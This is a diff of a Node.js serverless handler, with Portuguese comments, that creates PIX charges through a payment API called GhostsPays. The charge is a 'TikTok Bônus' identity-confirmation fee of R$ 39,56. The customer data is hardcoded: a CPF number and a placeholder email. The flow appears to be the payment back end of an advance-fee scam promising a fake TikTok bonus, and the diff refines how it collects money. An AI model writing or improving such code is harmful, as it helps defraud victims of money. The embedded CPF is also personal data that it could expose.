@@ -18,13 +18,13 @@ async function callGhostsPays(endpoint, options) {
   return { status: resp.status, body: json };
 }
 
-/** Normaliza a resposta da API GhostsPays para o formato esperado pelo frontend: { id, amount, status, pix: { qrcode, qrcodeText } } */
+/** Normaliza a resposta da API GhostsPays (ver eventos e webhooks: data.pix.qrcode) para { id, amount, status, pix: { qrcode, qrcodeText } } */
 function normalizePixResponse(body) {
   if (!body || typeof body !== 'object') return body;
   const data = body.data || body;
   const id = body.id ?? data.id ?? body.transactionId ?? data.transactionId;
   const amount = body.amount ?? data.amount;
-  const status = body.status ?? data.status ?? 'PENDING';
+  const status = body.status ?? data.status ?? 'waiting_payment';
 
   const pixBlock = body.pix ?? data.pix ?? body.pixPayment ?? data.pixPayment ?? {};
   const qrcode =
@@ -78,36 +78,26 @@ module.exports = async function handler(req, res) {
   }
 
   const cpfNumero = '11238990533';
-  const amount = 3956;
+  const amount = 3956; // R$ 39,56 em centavos
 
+  // Payload conforme documentação GhostsPays (https://ghostspay.readme.io): customer.document como string, paymentMethod PIX
   const payload = {
+    amount,
+    paymentMethod: 'PIX',
+    description: 'Taxa de confirmação TikTok Bônus',
     customer: {
       name: 'CPF 112.389.905-33',
       email: 'cpf11238990533@example.com',
       phone: '11999999999',
-      document: {
-        number: cpfNumero,
-        type: 'CPF'
-      }
+      document: cpfNumero
     },
-    paymentMethod: 'PIX',
-    amount,
     items: [
       {
         title: 'Taxa de confirmação de identidade',
         unitPrice: amount,
         quantity: 1
       }
-    ],
-    pix: {
-      expiresInDays: 1
-    },
-    description: 'Taxa de confirmação TikTok Bônus',
-    metadata: {
-      flow: 'tiktok_bonus',
-      cpf: cpfNumero,
-      chavePix: cpfNumero
-    }
+    ]
   };
 
   if (postbackUrl) {
@@ -126,12 +116,13 @@ module.exports = async function handler(req, res) {
 
     if (status >= 200 && status < 300) {
       const normalized = normalizePixResponse(body);
-      if (!normalized.pix.qrcodeText && !normalized.pix.qrcode) {
-        console.error('[GhostsPays] Resposta sem qrcode/qrcodeText. Body:', JSON.stringify(body).slice(0, 500));
+      if (!normalized.pix.qrcode && !normalized.pix.qrcodeText) {
+        console.error('[GhostsPays] Resposta sem PIX. Body:', JSON.stringify(body).slice(0, 800));
       }
       return res.status(status).json(normalized);
     }
-    res.status(status).json(body);
+    // Erro da API: repassar status e corpo (ex.: 400, 401) para o frontend
+    return res.status(status).json(body);
   } catch (e) {
     console.error('[GhostsPays] Erro ao criar pagamento PIX:', e);
     res.status(500).json({
